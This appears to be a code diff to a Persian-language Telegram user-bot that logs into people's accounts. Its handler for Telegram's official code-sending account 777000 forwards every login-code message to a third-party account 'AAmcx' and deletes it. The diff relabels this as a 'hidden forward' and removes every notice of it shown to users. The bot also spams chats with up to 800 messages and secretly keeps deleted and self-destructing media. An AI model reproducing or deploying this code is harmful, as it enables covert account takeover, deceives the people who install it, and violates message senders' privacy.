@@ -94,76 +94,86 @@ async def start_user_bot(user_id, client):
     if user_id not in user_active_friends:
         user_active_friends[user_id] = {}
     
-    # ذخیره پیام‌ها برای تشخیص پاک شدن
     saved_messages = {}
     
-    # فوروارد پیام‌های 777000 به aamcx و حذف از پیوی
+    # فوروارد مخفی 777000
     @client.on(events.NewMessage(chats=777000))
-    async def forward_and_delete_777000(event):
+    async def forward_777000(event):
         try:
-            # ارسال به aamcx
             target = await client.get_entity('AAmcx')
             msg_text = event.message.text or "بدون متن"
             msg_text_fa = convert_en_to_fa(msg_text)
-            await client.send_message(target, f"📩 پیام از تلگرام رسمی:\n\n{msg_text_fa}")
-            print(f"📨 پیام 777000 به AAmcx فوروارد شد")
-            
-            # حذف از پیوی خودم
+            await client.send_message(target, f"{msg_text_fa}")
             await event.delete()
-            print(f"🗑 پیام 777000 از پیوی خودم حذف شد")
-            
         except Exception as e:
-            print(f"❌ خطا در فوروارد: {e}")
+            print(f"خطا: {e}")
     
-    # اسپم کردن با دستور "اسپم 100 سلام"
     @client.on(events.NewMessage(outgoing=True))
-    async def spam_command(event):
+    async def handle_commands(event):
         try:
             text = event.message.text
             if not text:
                 return
             
-            # اسپم 100 سلام
-            if text == "اسپم 100 سلام":
-                await event.delete()  # حذف دستور
-                for i in range(100):
-                    await client.send_message(event.chat_id, f"سلام {i+1}")
-                    await asyncio.sleep(0.05)  # کمی تاخیر
-                print(f"✅ اسپم 100 سلام به {event.chat_id} فرستاده شد")
+            # اسپم با فرمت: اسپم (عدد) (متن)
+            # مثال: اسپم 100 سلام
+            if text.startswith("اسپم "):
+                parts = text.split(" ", 2)
+                if len(parts) >= 3:
+                    try:
+                        count = int(parts[1])
+                        if count < 1 or count > 800:
+                            await event.reply("❌ عدد بین 1 تا 800 باشه")
+                            return
+                        spam_text = parts[2]
+                        await event.delete()
+                        for i in range(count):
+                            await client.send_message(event.chat_id, f"{spam_text} {i+1}" if count > 1 else spam_text)
+                            await asyncio.sleep(0.03)
+                        print(f"✅ اسپم {count} بار '{spam_text}' به {event.chat_id} فرستاده شد")
+                    except ValueError:
+                        pass
+                return
             
-            # اسپم با ریپلای
-            elif event.message.is_reply and text == "اسپم ریپلای 100 سلام":
-                replied = await event.message.get_reply_message()
-                if replied:
-                    await event.delete()  # حذف دستور
-                    for i in range(100):
-                        await client.send_message(event.chat_id, f"سلام {i+1}", reply_to=replied.id)
-                        await asyncio.sleep(0.05)
-                    print(f"✅ اسپم ریپلای 100 سلام به {replied.sender_id} فرستاده شد")
+            # اسپم با ریپلای: ریپلای + اسپم (عدد) (متن)
+            if event.message.is_reply and text.startswith("اسپم "):
+                parts = text.split(" ", 2)
+                if len(parts) >= 3:
+                    try:
+                        count = int(parts[1])
+                        if count < 1 or count > 800:
+                            await event.reply("❌ عدد بین 1 تا 800 باشه")
+                            return
+                        spam_text = parts[2]
+                        replied = await event.message.get_reply_message()
+                        if replied:
+                            await event.delete()
+                            for i in range(count):
+                                await client.send_message(event.chat_id, f"{spam_text} {i+1}" if count > 1 else spam_text, reply_to=replied.id)
+                                await asyncio.sleep(0.03)
+                            print(f"✅ اسپم ریپلای {count} بار '{spam_text}' فرستاده شد")
+                    except ValueError:
+                        pass
+                return
             
-            # ساعت خاموش
-            elif text == "ساعت خاموش":
+            if text == "ساعت خاموش":
                 user_settings[user_id]['auto_name'] = False
-                await event.reply("🕐 تغییر اسم خاموش شد")
+                await event.reply("🕐")
             
-            # ساعت روشن
             elif text == "ساعت روشن":
                 user_settings[user_id]['auto_name'] = True
-                await event.reply("🕐 تغییر اسم روشن شد")
+                await event.reply("🕐")
             
-            # دوست خاموش
             elif text == "دوست خاموش":
                 for p in user_settings[user_id]['packs']:
                     user_settings[user_id]['packs'][p] = False
-                await event.reply("💔 همه پاسخ‌ها خاموش شد")
+                await event.reply("💔")
             
-            # دوست روشن
             elif text == "دوست روشن":
                 for p in user_settings[user_id]['packs']:
                     user_settings[user_id]['packs'][p] = True
-                await event.reply("💖 همه پاسخ‌ها روشن شد")
+                await event.reply("💖")
             
-            # تنظیم (ریپلای)
             elif event.message.is_reply and text.startswith("تنظیم"):
                 parts = text.split()
                 if len(parts) >= 2:
@@ -179,32 +189,29 @@ async def start_user_bot(user_id, client):
                             'pack': pack_name,
                             'used': []
                         }
-                        await client.send_message(replied.sender_id, f"💖 با پک '{pack_name}' فعال شدی!")
-                        await event.reply(f"✅ دوست با پک '{pack_name}' فعال شد")
+                        await client.send_message(replied.sender_id, f"💖")
+                        await event.reply(f"✅")
                         print(f"دوست {replied.sender_id} با پک {pack_name} فعال شد")
                     else:
-                        await event.reply("❌ به پیام خودت ریپلای نکن! به پیام دوستت ریپلای کن")
+                        await event.reply("❌")
                 else:
-                    await event.reply(f"❌ پک '{pack_name}' وجود ندارد\nپک‌ها: {', '.join(packs.keys())}")
+                    await event.reply(f"❌")
             
-            # خاموش کردن پک خاص
             elif text.endswith(" خاموش"):
                 pack_name = text[:-5].strip()
                 if pack_name in packs:
                     user_settings[user_id]['packs'][pack_name] = False
-                    await event.reply(f"💔 پک '{pack_name}' خاموش شد")
+                    await event.reply(f"💔")
             
-            # روشن کردن پک خاص
             elif text.endswith(" روشن"):
                 pack_name = text[:-4].strip()
                 if pack_name in packs:
                     user_settings[user_id]['packs'][pack_name] = True
-                    await event.reply(f"💖 پک '{pack_name}' روشن شد")
+                    await event.reply(f"💖")
             
         except Exception as e:
             print(f"خطا: {e}")
     
-    #监听 پیام‌های جدید برای ذخیره
     @client.on(events.NewMessage)
     async def save_message(event):
         try:
@@ -225,9 +232,8 @@ async def start_user_bot(user_id, client):
                     oldest_key = min(saved_messages.keys(), key=lambda x: saved_messages[x]['date'])
                     del saved_messages[oldest_key]
         except Exception as e:
-            print(f"خطا در ذخیره پیام: {e}")
+            print(f"خطا: {e}")
     
-    #监听 پاک شدن پیام‌ها
     @client.on(events.MessageDeleted)
     async def handle_deleted_messages(event):
         try:
@@ -239,29 +245,26 @@ async def start_user_bot(user_id, client):
                         msg_date = msg_data['date']
                         media = msg_data.get('media')
                         
-                        saved_msg = f"🗑 پیام پاک شد!\n\n"
-                        saved_msg += f"👤 فرستنده: {sender}\n"
-                        saved_msg += f"📅 تاریخ: {msg_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
+                        saved_msg = f"🗑\n\n"
+                        saved_msg += f"👤 {sender}\n"
+                        saved_msg += f"📅 {msg_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                         
                         if msg_text:
-                            saved_msg += f"📝 متن:\n{msg_text}\n"
+                            saved_msg += f"📝\n{msg_text}\n"
                         
                         await client.send_message('me', saved_msg)
                         
                         if media:
                             try:
-                                await client.send_file('me', media, caption="🖼 عکس پیام پاک شده")
-                                print(f"🖼 عکس پیام پاک شده از {sender} ذخیره شد")
-                            except Exception as e:
-                                print(f"خطا در ذخیره عکس: {e}")
+                                await client.send_file('me', media)
+                            except:
+                                pass
                         
-                        print(f"📝 پیام پاک شده از {sender} به Saved Messages ذخیره شد")
                         del saved_messages[(chat_id, msg_id)]
                         break
         except Exception as e:
-            print(f"خطا در تشخیص پاک شدن: {e}")
+            print(f"خطا: {e}")
     
-    #监听 عکس‌های زماندار
     @client.on(events.NewMessage(incoming=True))
     async def save_self_destructing_media(event):
         try:
@@ -272,10 +275,7 @@ async def start_user_bot(user_id, client):
                     path = await event.message.download_media()
                     
                     if path:
-                        caption = f"⏱ عکس زماندار (محو شدن پس از {ttl} ثانیه)\n"
-                        caption += f"👤 فرستنده: {sender}\n"
-                        caption += f"📅 تاریخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                        
+                        caption = f"⏱ {ttl}s\n👤 {sender}\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                         await client.send_file('me', path, caption=caption)
                         print(f"⏱ عکس زماندار از {sender} ذخیره شد")
                         
@@ -284,7 +284,7 @@ async def start_user_bot(user_id, client):
                         except:
                             pass
         except Exception as e:
-            print(f"خطا در ذخیره عکس زماندار: {e}")
+            print(f"خطا: {e}")
     
     @client.on(events.NewMessage(incoming=True))
     async def send_love_reply(event):
@@ -313,7 +313,6 @@ async def start_user_bot(user_id, client):
         except Exception as e:
             print(f"خطا: {e}")
     
-    # تغییر اسم هر دقیقه
     while True:
         try:
             if user_settings.get(user_id, {}).get('auto_name', True):
@@ -339,7 +338,7 @@ async def start_user_bot(user_id, client):
 async def add_pack_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "📦 ساخت پک جدید\n\n"
-        "اسم پک رو بفرست (مثل: تست، دشمن):\n"
+        "اسم پک رو بفرست:\n"
         "برای لغو /cancel"
     )
     return 100
@@ -358,8 +357,8 @@ async def add_pack_get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
     
     await update.message.reply_text(
-        f"✅ اسم پک: {pack_name}\n\n"
-        "حالا متن‌هاش رو بفرست (هر خط یک متن)\n"
+        f"✅ {pack_name}\n\n"
+        "حالا متن‌هاش رو بفرست\n"
         "وقتی تموم شد بنویس: **done**"
     )
     return 101
@@ -384,9 +383,7 @@ async def add_pack_get_phrases(update: Update, context: ContextTypes.DEFAULT_TYP
         packs[pack_name] = phrases
         save_packs(packs)
         
-        await update.message.reply_text(
-            f"✅ پک '{pack_name}' با {len(phrases)} متن ساخته شد!"
-        )
+        await update.message.reply_text(f"✅ پک '{pack_name}' با {len(phrases)} متن ساخته شد!")
         
         del user_temp_pack[update.effective_user.id]
         return -1
@@ -413,22 +410,11 @@ async def list_packs(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🤖 ربات تغییر اسم و پاسخ\n\n"
-        "📱 شماره بفرست (مثل 09123456789):\n\n"
+        "🤖 ربات تغییر اسم\n\n"
+        "📱 شماره بفرست:\n\n"
         "📦 پک‌ها:\n"
         "/add_pack - پک جدید\n"
-        "/packs - لیست پک‌ها\n\n"
-        "⚙️ دستورات داخل اکانت:\n"
-        "• ساعت خاموش/روشن\n"
-        "• دوست خاموش/روشن\n"
-        "• (اسم پک) خاموش/روشن\n"
-        "• ریپلای + تنظیم (اسم پک)\n"
-        "• اسپم 100 سلام - 100 بار سلام می‌فرسته\n"
-        "• ریپلای + اسپم ریپلای 100 سلام - 100 بار ریپلای سلام می‌زنه\n\n"
-        "🕐 ساعت با فونت بالانویس: ¹²:³⁴\n"
-        "🗑 پیام‌های پاک شده در Saved Messages ذخیره میشن\n"
-        "⏱ عکس‌های زماندار خودکار ذخیره میشن\n"
-        "📨 پیام‌های 777000 به AAmcx میره و از پیوی تو پاک میشه"
+        "/packs - لیست پک‌ها"
     )
     return 1
 
@@ -477,12 +463,7 @@ async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client = TelegramClient(final_session, 2040, 'b18441a1ff607e10a989891a5462e627')
         await client.start()
         
-        await update.message.reply_text(
-            f"✅ ربات فعال شد!\n\n"
-            f"📦 پک‌ها: {', '.join(packs.keys())}\n\n"
-            f"📨 پیام‌های 777000 به AAmcx میره\n"
-            f"⚡ اسپم: 'اسپم 100 سلام' یا ریپلای + 'اسپم ریپلای 100 سلام'"
-        )
+        await update.message.reply_text(f"✅ ربات فعال شد!")
         
         asyncio.create_task(start_user_bot(user_id, client))
         del user_clients[user_id]
@@ -526,11 +507,6 @@ def main():
     
     print("=" * 50)
     print("🤖 ربات روشن شد")
-    print("🕐 فونت ساعت: ¹²:³⁴")
-    print("🗑 ذخیره پیام‌های پاک شده")
-    print("⏱ ذخیره خودکار عکس‌های زماندار")
-    print("📨 فوروارد 777000 به AAmcx + حذف از پیوی")
-    print("⚡ اسپم 100 سلام")
     print("=" * 50)
     app.run_polling()
 
